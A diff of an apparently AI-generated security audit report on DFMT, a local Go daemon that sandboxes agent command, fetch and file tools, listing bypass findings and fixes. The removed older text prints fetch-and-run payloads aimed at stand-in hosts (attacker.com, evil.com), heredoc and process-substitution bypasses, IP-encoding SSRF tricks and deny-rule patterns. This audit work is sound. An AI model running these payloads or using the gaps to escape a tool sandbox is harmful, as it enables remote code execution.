@@ -1,253 +1,148 @@
 # DFMT Security Report — 2026-05-01
 
-**Target:** DFMT (`D:\Codebox\PROJECTS\DFMT`)  
-**Scan type:** Full security audit (4-phase pipeline)  
-**Languages:** Go 100%  
-**Phase:** Recon → Hunt → Verify → Report
+**Scan scope:** Full codebase  
+**Agents:** 5 parallel (Recon, Go Security, Secrets/Data, Injection/AuthZ, Dependency)  
+**Prior audit:** 2026-04-28 (8 commits, 6 defects closed)
 
 ---
 
 ## Executive Summary
 
-DFMT is a well-engineered local daemon with strong foundational security controls. After this update, **all Critical findings are resolved**. The remaining High-severity items are primarily design-tradeoff decisions (no bearer-token auth on HTTP JSON-RPC, documented as intentional) and Windows-specific path-normalization gaps. The SSRF cloud-metadata IP blocklist gaps are Medium-severity and addressable in a follow-up sprint.
+DFMT is a well-architected local daemon with strong security foundations:
+- **stdlib-only dependency policy** — only `golang.org/x/sys` + `gopkg.in/yaml.v3`, everything else bundled in-tree
+- **Defense-in-depth redaction** — two independent layers before journal write
+- **Strict exec allow-list policy** — hard-deny invariant, shell operator splitting, env var injection blocked
+- **SSRF protection** — DNS rebinding resistant, cloud metadata IPs blocklisted
+- **Symlink-safe atomic writes** — `safefs` helper at all write seams
 
-| Severity | Count | Open | Fixed | New |
-|----------|-------|------|-------|-----|
-| Critical | 1 | 0 | 1 | 0 |
-| High | 7 | 7 | 0 | 0 |
-| Medium | 5 | 5 | 0 | 0 |
-| Low | 11 | 11 | 0 | 0 |
-| Info | 34 | 0 | 34 | 0 |
-| **Total** | **58** | **23** | **35** | **0** |
-
-**Risk Score: 5.4 (Medium)** — AUTHZ-01 (Critical RCE bypass) resolved in `b861a28`. Risk score driven now by AUTH-01/02 (no-transport-auth by design) and open SSRF/AUTHZ gaps.
-
-**Notable correction this update:** AUTHZ-01 was incorrectly marked unfixed — the F-01 bypass (`git "$(curl ... | sh)"`) was closed in commit `b861a28` (`splitByShellOperators` now recurses into double-quoted command substitutions). The fix is verified by `TestSubstitutionInsideDoubleQuotesIsSplit` and `TestExecQuotedSubstitutionDenied` (both pass). `index.gob` uses JSON, not gob — the CLAUDE.md gob note was stale.
+**Residual risk profile:** Local-only daemon for a single-user workstation. The threat model does NOT assume a malicious local peer. Several findings rated High/Medium are acceptable under this model but would be critical in multi-user or containerized deployments.
 
 ---
 
-## Phase 1: Architecture
+## New Findings This Scan
 
-See `security-report/architecture.md` for full mapping.
+### N-01 | Write TOCTOU — Symlink Leaf Not Rejected at Open Time
+| | |
+|---|---|
+| **CWE** | CWE-367 (Time-of-check Time-of-use) |
+| **File** | `internal/safefs/safefs.go:178-196` |
+| **Severity** | High |
+| **Confidence** | 85% |
+| **Description** | `os.WriteFile` is called without `O_NOFOLLOW`. A symlink planted at the final path component (e.g., `malicious → /etc/passwd`) is followed during write open, even though `EvalSymlinks` was previously checked on the resolved path. The containment check catches the target, but only via `EvalSymlinks` — a race between `EvalSymlinks` check and `WriteFile` open could bypass it. |
+| **Recommendation** | Open with `O_NOFOLLOW` (Unix) / `FILE_FLAG_OPEN_REPARSE_POINT` (Windows) at the write call site |
 
-- **Entry points:** CLI (`cmd/dfmt/main.go`), MCP stdio (`mcp.go`), HTTP JSON-RPC + dashboard (`http.go`), Unix socket (`socket.go`)
-- **Primary attack surface:** `internal/sandbox/permissions.go` — exec allowlist enforcement, SSRF blocklists, fetch URL normalization
-- **Data flow:** MCP/CLI → handlers → sandbox policy → 8-stage normalization → journal/index
-- **Auth model:** "same UID = trusted" — no per-request auth; trust delegated to OS-level UID separation
-- **Dependencies:** Only `golang.org/x/sys` + `gopkg.in/yaml.v3` (strict stdlib-first policy)
-- **Security posture:** AUTHZ-01 (Critical RCE) fixed in `b861a28`; all other findings tracked in this report
+### N-02 | Redaction Bypass via Re-used content_id
+| | |
+|---|---|
+| **CWE** | CWE-200 (Exposure of Sensitive Information) |
+| **File** | `internal/transport/handlers.go:67`, `internal/content/store.go` |
+| **Severity** | Medium |
+| **Confidence** | 75% |
+| **Description** | Cross-call wire dedup returns `(unchanged; same content_id)` without re-applying redaction. If the first emission was pre-redaction and the second is post-redaction (journal reload scenario), cached redacted output is returned without re-verification. |
+| **Recommendation** | Re-apply redaction on content_id cache hit, or invalidate cache on redact.yaml changes |
 
----
-
-## Phase 2: Verified Findings
-
-### Critical
-
-#### AUTHZ-01 — Command Substitution Bypass (RCE) ✅ FIXED
-**Severity:** Critical | **Confidence:** 100% | **CWE:** CWE-78, CWE-94
-**Fix commit:** `b861a28` — `fix(security): close F-01 RCE bypass via quoted command substitution`
-
-`permissions.go:1186-1210` — `splitByShellOperators` recurses into `"$(...)"` and backtick substitutions inside double-quoted strings. The fix was verified by `TestSubstitutionInsideDoubleQuotesIsSplit` and `TestExecQuotedSubstitutionDenied` (both pass). The previous proof-of-concept `git "$(curl http://attacker.com/x.sh | sh)"` now splits into `git`, `curl`, `sh` — and `sh` is blocked by the hard-deny rule `deny:exec:sh *`.
-
----
-
-### High
-
-#### AUTH-01 — Bearer Token Auth Fully Disabled
-**Severity:** High | **Confidence:** 100% | **CWE:** CWE-306
-
-Bearer-token plumbing was fully removed in commit `97c25fa` (F-22). The HTTP JSON-RPC transport at `http.go` has **no authentication** — any process that can reach the loopback port (or Unix socket on Unix) has full access to `dfmt.exec` (RCE), `dfmt.fetch` (SSRF), `dfmt.write/edit` (file write), and all session/journal data.
-
-**Status from prior scan:** AUTH-01 was filed as High then. **Not yet fixed.** Documented as intentional.
-
-#### AUTH-02 — Dashboard Has No Authentication
-**Severity:** High | **Confidence:** 100% | **CWE:** CWE-306
-
-Dashboard routes (`/dashboard`, `/dashboard.js`) at `http.go` have no authentication. The only protection is loopback-only binding (F-09). On a shared-host scenario, any local user can access the dashboard and view all session events.
-
-**Status from prior scan:** AUTH-02 was filed as High then. **Not yet fixed.** Documented as intentional.
-
-#### AUTHZ-02 — Glob/Grep Read Deny Rules Bypassed on Per-File Evaluation
-**Severity:** High | **Confidence:** 85% | **CWE:** CWE-22
-
-Direct `Read` tool respects deny rules (`.env*`, `**/secrets/**`, etc.) at `permissions.go:150-167`. However, `Glob` and `Grep` evaluate path patterns **after glob expansion** — each resolved path is checked individually. If a deny rule like `**/.env*` matches 50 files and the agent uses a glob that matches only 2 of those files, the per-file evaluation runs on those 2 files. Since the expanded paths are already known (not user-supplied patterns), the deny check sees `"/project/.env"` and `.env` doesn't match `**/secrets/**`, so the read is allowed.
-
-**Status from prior scan:** AUTHZ-02 was filed as High then. **Not yet fixed.**
-
-#### AUTHZ-03 — Windows Write/Edit Deny Rules Don't Normalize Backslash Paths
-**Severity:** High | **Confidence:** 90% | **CWE:** CWE-22, CWE-434
-
-The deny-rule pattern matcher at `permissions.go:300-330` uses forward-slash (`/`) path separators in pattern-to-path comparisons. On Windows, agent-supplied paths use backslash (`\`). A deny rule `**/.env*` does NOT match `C:\.env` because the pattern's `/` doesn't match the path's `\`.
-
-**Status from prior scan:** AUTHZ-03 was filed as High then. **Not yet fixed.**
-
-#### CMDI-001 / CMDI-010 — Shell Execution Model Allows Command Chaining
-**Severity:** High | **Confidence:** 85% | **CWE:** CWE-78
-
-The exec sandbox intentionally invokes `bash -c req.Code` for shell languages. The policy check runs before execution but the shell interprets metacharacters at runtime. While `splitByShellOperators` handles most chain patterns, double-quoted command substitution (`AUTHZ-01`) and heredoc (`CMDI-01`) remain exploitable.
-
-**Status from prior scan:** CMDI-001/CMDI-010 were filed then. **Not yet fixed.**
-
-#### CMDI-002 — PATH Prepend World-Writable Hijack
-**Severity:** Medium → High | **Confidence:** 70% | **CWE:** CWE-78
-
-`WithPathPrepend` + `ValidatePathPrepend` at `permissions.go:650-716` allow operators to prepend directories to PATH. `ValidatePathPrepend` warns (but does not error) on world-writable directories. A local attacker can plant a malicious `git` or `npm` binary in such a directory, achieving code execution in the daemon's context.
-
-**Status from prior scan:** CMDI-002 was filed then. **Not yet fixed.**
+### N-03 | Exec LookPath Cache Not Invalidated on PATH Change
+| | |
+|---|---|
+| **CWE** | CWE-78 (Command Injection) |
+| **File** | `internal/sandbox/runtime.go:116` |
+| **Severity** | Low |
+| **Confidence** | 80% |
+| **Description** | `exec.LookPath` result cached in `sync.RWMutex` map, re-probed only on SIGUSR1 or `dfmt doctor`. If a prior allowed exec modifies `PATH` (e.g., `.bashrc`), subsequent lookups for `git`, `npm`, `python` could resolve to a different binary. The exec policy allowlist uses base command strings (not resolved paths), so policy itself remains effective. |
+| **Recommendation** | Add `LookPath` cache invalidation on significant env var changes, or log a warning when `PATH` env var is modified via an allowed exec |
 
 ---
 
-### Medium
+## Verified Prior Findings — Status
 
-#### SSRF-001 — Azure IMDS Endpoint `168.63.129.16` Not Blocked
-**Severity:** Medium | **CVSS:** 6.5 | **CWE:** CWE-918
-
-`permissions.go:1436` (`isBlockedIP`) blocks `169.254.169.254` (AWS/GCP metadata) but not `168.63.129.16` (Azure IMDS). An SSRF vector that resolves to this IP could fetch Azure instance metadata.
-
-**File:** `internal/sandbox/permissions.go`  
-**Status: Open.** Fix: add `168.63.129.16` to `isBlockedIP`.
-
-#### SSRF-002 — GCP `metadata.goog.internal` / `metadata.goog.com` Not in Blocklist
-**Severity:** Medium | **CVSS:** 4.3 | **CWE:** CWE-918
-
-The hostname blocklist does not include `metadata.goog.internal` or `metadata.goog.com` (GCP legacy endpoints).  
-**Status: Open.**
-
-#### SSRF-003 — IP Encoding Bypasses Policy Regex
-**Severity:** Medium | **CVSS:** 5.5 | **CWE:** CWE-918
-
-Octal (`0177.0.0.01`), hex (`0x7F.0x0.0x01`), and Dword (`2134494511`) IP representations bypass the regex-based IP blocklist layer. The custom `DialContext` validates resolved IPs correctly, but the regex layer is the first check and can be bypassed to reach blocked hosts.
-
-**Status from prior scan:** SSRF-003 was filed then. **Not yet fixed.**
-
-#### SSRF-005 — Redirect Re-Check Doesn't Apply Cloud Metadata Block
-**Severity:** Medium | **CVSS:** 4.3 | **CWE:** CWE-918
-
-Redirect following re-checks `assertFetchURLAllowed` but does not re-apply the cloud-metadata IP blocklist to the redirect target. A first-hop URL resolving to a safe IP that redirects to `168.63.129.16` would bypass the block.
-
-**Status: Open.** Fix: apply `isBlockedIP` to all redirect hop IPs.
+| ID | Description | Status |
+|---|---|---|
+| AUTHZ-01 | Command substitution bypass | **FIXED** in `b861a28` |
+| AUTH-01 | Bearer token auth disabled | **Open** — No auth on HTTP JSON-RPC loopback |
+| AUTHZ-03 | Windows backslash path normalization | **Open** — High severity; backslashes not normalized before regex matching |
+| CMDI-001/010 | Shell chaining allowed | **Open** — By design for `bash`/`sh`; policy check runs first |
+| F-09 | Non-loopback HTTP bind refused | **Closed** — Loopback-only enforced at `Start()` |
+| F-22 | Dead bearer-token plumbing removed | **Closed** |
+| F-04/F-07/F-08/F-25 | Symlink-safe write helper | **Closed** — `safefs` helper centralizes atomic writes |
 
 ---
 
-### Low
+## Security Controls Assessment
 
-#### CMDI-003 — Environment Variable Injection via `req.Env` Map
-**Severity:** Low | **Confidence:** 80% | **CWE:** CWE-78
+### What DFMT Does Well
 
-`buildEnv` at `permissions.go:2331-2341` merges agent-supplied env vars via a blocklist (`isSandboxEnvBlocked`). The blocklist covers `LD_*`, `DYLD_*`, `GIT_*`, `NODE_*`, `PATH`, `AWS_*`, etc. A missed dangerous variable (e.g., `EXECPATH`) could influence subprocess behavior. Low risk due to layered defenses.
+| Control | Implementation |
+|---|---|
+| **Dependency policy** | stdlib-only; only `golang.org/x/sys` + `gopkg.in/yaml.v3` permitted (ADR-0004) |
+| **Secret redaction** | 2-layer defense; regex patterns for 30+ providers; env-export pass; idempotent |
+| **Exec allow-list** | Default deny; hard-deny invariant (ADR-0014); trailing space+`*` boundary; shell operator splitting |
+| **Env var injection block** | `LD_`, `DYLD_`, `GIT_`, `NODE_`, `PYTHON`, `JAVA_` prefixes blocked; `PATH`, `IFS` blocked by name |
+| **SSRF protection** | Custom `DialContext`; DNS resolution validated before dial; redirect chain checked; 10-redirect cap; cloud metadata IPs blocklisted |
+| **Path traversal** | `filepath.Clean` + containment + `EvalSymlinks` check + per-file policy enforcement |
+| **Symlink safety** | `safefs.CheckNoSymlinks` on every write/edit path; atomic tmp+rename |
+| **Header injection block** | CR/LF/colon validation before passing to `http.Transport` |
+| **Concurrency** | `sync.Mutex`/`sync.RWMutex` in journal, index, dedup map, handler state |
+| **Journal integrity** | Append-only JSONL with ULID segments; gzip compression on rotation |
+| **Wire dedup** | `content_id` prevents re-sending already-seen payloads (ADR-0009/ADR-0011) |
 
-#### CMDI-004 — Non-Shell Runtime Resolution Uses `exec.LookPath`
-**Severity:** Info→Low | **Confidence:** 90% | **CWE:** CWE-78
+### Residual Risks by Category
 
-For non-shell runtimes (python, node), `runtime.go:110-121` resolves the executable via `exec.LookPath`. Probe happens once at startup, not per-request. Limited impact.
-
-#### CMDI-009 — TOCTOU in Policy Evaluation
-**Severity:** Low | **Confidence:** 75% | **CWE:** CWE-362
-
-Policy check at `permissions.go:956-1041` is synchronous within a single request. No concurrent hot-reload of policy. Low risk.
-
-#### SSRF-004 — AWS IPv6 Metadata Address `fd00:ec2::254` Not Blocked
-**Severity:** Low | **CVSS:** 3.7 | **CWE:** CWE-918
-
-`fd00:ec2::254` (AWS EC2 IPv6 metadata endpoint) is not in the IPv6 blocklist.  
-**Status: Open.**
-
-#### SSRF-006 — No Alerting When SSRF Probes Blocked
-**Severity:** Low | **CVSS:** 2.1 | **CWE:** CWE-918
-
-Blocked SSRF attempts are silently dropped. Logging them at warn level would aid incident detection.  
-**Status: Open.**
-
-#### SSRF-007 — URL Scheme Enforcement Not Operator-Overrideable
-**Severity:** Low | **CVSS:** 3.1 | **CWE:** CWE-918
-
-Scheme enforcement (`http`, `https` only) is hardcoded in the policy layer (`permissions.go:1450`). If an operator needs to fetch from `file://` or `ftp://` URIs, there is no override path. Low impact for a local sandbox.
-
-#### CMDI-01 — Heredoc Body Not Policy-Checked
-**Severity:** Low | **Confidence:** 85% | **CWE:** CWE-78
-
-`<<<` here-strings are not classified as shell operators by `splitByShellOperators`. Heredoc content bypasses the policy chain check. `git diff <<< "$(malicious command)"` would pass the allowlist.
-
-#### CMDI-02 — Here-String and Process Substitution Not Classified
-**Severity:** Low | **Confidence:** 80% | **CWE:** CWE-78
-
-`<(...)` and `>(...)` process substitutions are not classified as shell operators. `<(curl http://evil.com)` would not be caught.
-
-#### XSS-01 — `style-src 'unsafe-inline'` in Dashboard CSP
-**Severity:** Low | **Confidence:** 100% | **CWE:** CWE-346
-
-Dashboard CSP allows `style-src 'unsafe-inline'`. CSS exfiltration requires proximity to sensitive dashboard data (none present). Acceptable risk for a local-only tool.
-
-#### XSS-02 — No CSP `report-uri`
-**Severity:** Info | **Confidence:** 100% | **CWE:** CWE-346
-
-CSP violations are not reported. Low priority for a single-user local daemon.
+| Category | Risk | Note |
+|---|---|---|
+| **Local Privilege** | High | No daemon auth on loopback TCP — any same-user process can send JSON-RPC calls |
+| **Windows Path Norm** | High | `AUTHZ-03` open — backslash paths bypass deny regex on Windows |
+| **Write TOCTOU** | High | `N-01` — symlink leaf at final path component followed on write open |
+| **SSRF** | Medium | IP encoding bypass possible; Azure/GCP metadata endpoints blocklisted but IPv6 not fully tested |
+| **Redaction coverage** | Medium | Bare AWS secrets, Azure storage keys, GCP `client_email` not covered |
+| **LookPath cache** | Low | `N-03` — cached binary paths survive env changes |
+| **Redaction dedup bypass** | Medium | `N-02` — content_id reuse skips redaction re-apply |
+| **Dashboard** | Low | Unauthenticated; serves static HTML only; loopback-only |
+| **Path/URL not redacted** | Low | By design — operators with secrets in path names must use `redact.yaml` override |
 
 ---
 
-## Phase 3: False Positives Eliminated (34 Info findings)
+## Dependency & Supply Chain
 
-All 34 Info-rated findings were verified as **safe patterns**:
+| Check | Result |
+|---|---|
+| `go.mod` only declares `golang.org/x/sys` + `gopkg.in/yaml.v3` | **PASS** |
+| `go.sum` no hidden indirect runtime deps | **PASS** (test-only `check.v1` not compiled into binaries) |
+| No vendor/ directory | **PASS** |
+| All bundled libs in-tree (BM25, Porter, HTML, MCP, JSON-RPC) | **PASS** |
+| `golang.org/x/sys` CVE status | **Low** |
+| `gopkg.in/yaml.v3` CVE status | **Low-current** (v3.0.0 DoS fixed in v3.0.1; used only for operator config) |
+| Dockerfile / docker-compose | **Not present** |
 
-| Finding | Why it's safe |
-|---------|--------------|
-| `PATH-01` Glob symlink escape | `safefs.EnsureResolvedUnder` at `permissions.go:1685` |
-| `PATH-02` Grep symlink escape | `safefs.EnsureResolvedUnder` at `permissions.go:1837` |
-| `PATH-03` Symlink root widen | Layered with `CheckNoSymlinks` + `WriteFileAtomic` |
-| `DESER-01` gob deserialization | **Not gob** — `index.gob` is JSON (`json.Marshal`/`json.Unmarshal`). Filename is backwards-compat artifact only. |
-| `DESER-02` JSON unmarshaling | All targets typed structs; `Event.Data` is `map[string]any`, no `interface{}` instantiation |
-| `DESER-03` yaml.v3 alias expansion | `permissions.yaml` is not parsed as YAML — hand-rolled line parser. yaml.v3 alias expansion DoS is internally mitigated. |
-| `SSTI-01` No template engine | Zero `html/template` / `text/template` usage; dashboard serves static bytes only |
-| `SECRETS-01` No hardcoded secrets | All matches are test fixtures (`[AWS_KEY]`, `sk-DO-NOT-LEAK`, etc.) or env var reads at runtime |
-| `XSS` HTML normalization | `htmlDropElements` explicitly drops `script`, `iframe`, `svg`, `form`, `button`; output is markdown not HTML |
-| `RACE-01` through `RACE-03` | Pre-existing races documented as accepted residuals; fuzz tests confirm invariants |
+**Policy compliance: PASS.** No third-party code beyond the two allowed modules.
 
 ---
 
-## Phase 4: Remediation Roadmap
+## Recommended Priority Fixes
 
-### Phase 1 (Critical — Fix within 1 week)
-
-1. **AUTHZ-01 (Critical RCE):** Fix `splitByShellOperators` to recurse into double-quoted command substitutions, or add a secondary check that detects `$(...)` and backtick substitutions anywhere in the code string before passing to `bash -c`. Consider blocking shell invocation for commands that appear in allow rules (only allow specific binaries, not `bash`).
-
-### Phase 2 (High — Fix within 2 weeks)
-
-2. **AUTH-01 / AUTH-02:** Document the trust model explicitly in `docs/ARCHITECTURE.md` and add a security warning in the dashboard. Consider operator-configurable auth for multi-user hosts.
-3. **AUTHZ-02:** For Glob/Grep, pre-check deny patterns against the entire expanded path set before executing.
-4. **AUTHZ-03:** Normalize `\` to `/` in path comparisons on Windows before pattern matching.
-5. **CMDI-001/CMDI-010:** Block shell operators inside allow-rule commands or implement command-boundary enforcement that prevents chaining.
-6. **CMDI-002:** Make world-writable `pathPrepend` a hard error on Unix; document clearly.
-7. **CMDI-01, CMDI-02:** Extend `splitByShellOperators` to classify `<<<`, `<(...)`, `>(...)`.
-
-### Phase 3 (Medium — Fix within 1 month)
-
-8. **SSRF-001:** Add `168.63.129.16` to `isBlockedIP`.
-9. **SSRF-002:** Add `metadata.goog.internal` and `metadata.goog.com` to hostname blocklist.
-10. **SSRF-003:** Convert IP blocklist from regex to numeric validation that handles all encoding forms.
-11. **SSRF-005:** Apply `isBlockedIP` to all redirect hop target IPs.
-12. **SSRF-004:** Add `fd00:ec2::254` to IPv6 blocklist.
-
-### Phase 4 (Low — Fix within 3 months)
-
-13. **SSRF-006:** Add warn-level logging for blocked SSRF attempts.
-14. **SSRF-007:** Consider operator-overrideable URL scheme list.
-15. **CMDI-003:** Review blocklist comprehensiveness; add `EXECPATH` and other less-common loader variables.
-16. **CMDI-004:** Consider storing hash/signature of known-good binaries to detect PATH hijack post-probe.
+| Priority | Finding | Action |
+|---|---|---|
+| **High** | AUTHZ-03 | Normalize Windows backslash paths before regex match in `permissions.go:300-330` |
+| **High** | N-01 | Add `O_NOFOLLOW` / `FILE_FLAG_OPEN_REPARSE_POINT` to `os.WriteFile` call sites in `safefs` |
+| **High** | AUTH-01 | Add bearer-token auth to HTTP JSON-RPC endpoint, or document loopback-only threat model clearly in `SECURITY.md` |
+| **Medium** | N-02 | Re-apply redaction on content_id cache hit, or invalidate cache on redact.yaml reload |
+| **Medium** | Redaction gaps | Add Azure storage account key pattern (`[A-Za-z0-9/+=]{88}`) and bare AWS secret value catchall |
+| **Low** | N-03 | Log warning when `PATH` env var modified via allowed exec; add SIGUSR1 trigger for cache refresh |
 
 ---
 
-## Scan Statistics
+## Attack Surface Summary
 
-| Metric | Value |
-|--------|-------|
-| Skills activated | 12 (sc-recon, sc-lang-go, sc-cmdi, sc-ssrf, sc-path-traversal, sc-secrets, sc-xss, sc-auth, sc-authz, sc-race-condition, sc-deserialization, sc-ssti) |
-| Skills not activated | 36 (no SQL/NoSQL/GraphQL/XXE/LDAP/FileUpload/OpenRedirect/CSDRF/Clickjacking/WebSocket/JWT/RateLimiting/IaC/Docker/CI-CD; no TS/Python/PHP/Rust/Java/C#) |
-| Infrastructure files | None (no Dockerfile, Terraform, K8s, GitHub Actions) |
-| Total findings | 58 |
-| True positives | 24 |
-| False positives | 34 |
-| Report files | `security-report/` |
+| Vector | Mitigations | Residual Risk |
+|---|---|---|
+| Command Injection | Policy allowlist, shell splitting, hard-deny invariant | **Medium** — shell languages intentionally allow `bash -c cmd` |
+| Write TOCTOU | `safefs` + atomic write | **High** — final-symlink not rejected at open time |
+| SSRF | Blocklist + custom DNS resolver + redirect cap | **Medium** — IPv6 encoding edge cases |
+| Path Traversal | `safefs` + containment + symlink check + per-file deny | **Low** |
+| Credential Theft | Redaction pipeline + 2-layer defense + default deny | **Medium** — path/URL not redacted by design |
+| Local Peer Auth | Loopback-only bind, filesystem socket perms | **High** — no daemon auth on loopback |
+| Windows Path | Backslash normalization | **High** — AUTHZ-03 unfixed |
+| MCP Parsing | Static dispatch, concrete struct unmarshal, 1MB body limit | **Low** |
 
 ---
 
-*Report generated by security-check skill (v1.1.0). Next recommended scan: 2026-06-01 or after any significant sandbox/permissions change.*
+*Report generated by security-check (5-agent parallel scan: Recon + Go Security + Secrets/Data + Injection/AuthZ + Dependency Audit)*
